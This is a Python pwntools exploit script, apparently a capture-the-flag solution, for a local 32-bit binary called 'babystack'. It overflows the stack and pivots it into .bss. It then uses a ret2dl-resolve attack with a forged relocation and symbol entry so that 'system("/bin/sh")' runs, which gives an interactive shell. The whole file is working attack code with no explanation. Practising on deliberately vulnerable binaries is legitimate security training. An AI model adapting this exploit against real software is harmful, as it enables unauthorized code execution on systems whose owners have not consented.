#!/usr/bin/python

from pwn import *

context.log_level = 'debug'

elf = ELF('./babystack')

ppp_ret = 0x080484e9
pop_ebp_ret = 0x080484eb
leave_ret = 0x080483a8

bss = 0x0804a020
stack_size = 0x800
base_stage = bss + stack_size 

offset = 0x2c
read_plt = elf.plt['read']
vuln_addr = 0x0804843B

p = process('./babystack')
#gdb.attach(p)

payload = 'A' * offset 
payload += p32(read_plt)
payload += p32(vuln_addr)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
p.send(payload)

sleep(0.5)

cmd = '/bin/sh'
plt_0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
index_offset = base_stage + 20 - rel_plt
read_got = elf.got['read']
fake_sym_addr = base_stage + 28
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr += align
index_sym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_sym << 0x8) | 0x7
fake_reloc = p32(read_got) + p32(r_info)
st_name = fake_sym_addr + 0x10 - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
gnu_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
log.info('ndx addr %s' % hex(gnu_addr + index_sym * 2))

payload2 = 'BBBB'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'BBBB'
payload2 += p32(base_stage + 80)
payload2 += fake_reloc
payload2 += 'B' * align
payload2 += fake_sym
payload2 += 'system\x00'
payload2 += 'B' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'B' * (100 - len(payload2))
p.send(payload2)

sleep(0.5)

payload3 = 'C' * offset
payload3 += p32(pop_ebp_ret)
payload3 += p32(base_stage)
payload3 += p32(leave_ret)
p.send(payload3)

sleep(0.5)

p.interactive()
